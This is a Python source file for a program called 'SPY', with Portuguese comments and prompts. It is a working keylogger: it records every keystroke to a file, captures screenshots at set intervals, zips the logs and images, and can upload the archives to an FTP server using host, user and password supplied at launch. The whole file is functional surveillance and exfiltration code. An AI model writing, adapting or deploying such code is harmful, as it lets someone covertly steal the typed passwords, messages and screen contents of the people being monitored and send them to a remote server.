from pynput.keyboard import Key, Listener
from apscheduler.schedulers.background import BackgroundScheduler
from zipfile import *
import pyscreenshot as ImageGrab
import logging
import ftplib


log_dir = ""
logFile = "keyboard.txt"

sched = BackgroundScheduler()
printscreen_number = 0
spy_number = 0
host = ""
usuario = ""
senha = ""
translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": "\n",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.ctrl": "",
        "Key.caps_lock": "",
    }

logging.basicConfig(
	filename=(log_dir + "log.txt"),
	level=logging.DEBUG,
	format='["%(asctime)s", %(message)s]')

def on_press(key):
    

    pressed = "{0}".format(key).replace("'", "") 
    logging.info('"' + pressed + '"')

    for key in translate_keys:
        #key recebe a chave do dicionário translate_keys
        #substituir a chave (key) pelo seu valor (translate_keys[key])
        pressed = pressed.replace(key, translate_keys[key])

    #abrir o arquivo de log no modo append
    with open(logFile, "a") as f:
        f.write(pressed)

def printscreen_job():
    global printscreen_number
    im = ImageGrab.grab()
    printscreen_number = printscreen_number + 1
    im.save('screenshot' + str(printscreen_number) + '.png')
    print("Arquivo 'screenshot" + str(printscreen_number) + ".png' gerado")

def zipFiles():
    global spy_number
    spy_number = spy_number + 1
    file_name = "spy" + str(spy_number) + ".zip"
    zip_archive = ZipFile(file_name, "w")
    try:
        zip_archive.write("log.txt")
    except Exception:
        pass
    
    try:
        zip_archive.write("keyboard.txt")
    except Exception:
        pass

    global printscreen_number

    if printscreen_number>0:
        for i in range (1, printscreen_number+1):
            zip_archive.write('screenshot' + str(i) + '.png')

    zip_archive.close();

    print ("Arquivo comprimido '" + file_name + "' gerado.")

    if resp==1:
        global host
        global usuario
        global senha
        session = ftplib.FTP(host,usuario,senha)
        file = open(file_name,'rb')                  # file to send
        session.storbinary('STOR ' + file_name, file)     # send the file
        file.close()                                    # close file and FTP
        session.quit()
        print ("Arquivo '" + file_name + "' enviado ao servidor.")

print("Bem-vindo ao SPY!\n\nEste programa permite capturar as teclas digitadas, capturar a imagem da tela a cada X segundos, comprimir os dados gerados e enviar por FTP.\n")
interval_printscreen = int(input("Digite o intervalo de tempo (segundo) para PRINTSCREEN ou 0 para não realização: "))
interval_zipfiles = int(input("Digite o intervalo de tempo (segundo) para compressão dos arquivos ou 0 para não realização: "))

if interval_zipfiles>0:
    resp = int(input("Enviar arquivos comprimidos para o servidor FTP? (1 - Sim, 0 - Não): "))
    if resp==1:
        host = input("Digite o host: ")
        usuario = input("Digite o usuário: ")
        senha = input("Digite a senha: ")

if interval_printscreen>0: sched.add_job(printscreen_job, 'interval', seconds=interval_printscreen)
if interval_zipfiles>0: sched.add_job(zipFiles, 'interval', seconds=interval_zipfiles)

print ("\n\nEstamos capturando... aproveite!\n\n")
sched.start()

with Listener(on_press=on_press) as listener:
    listener.join()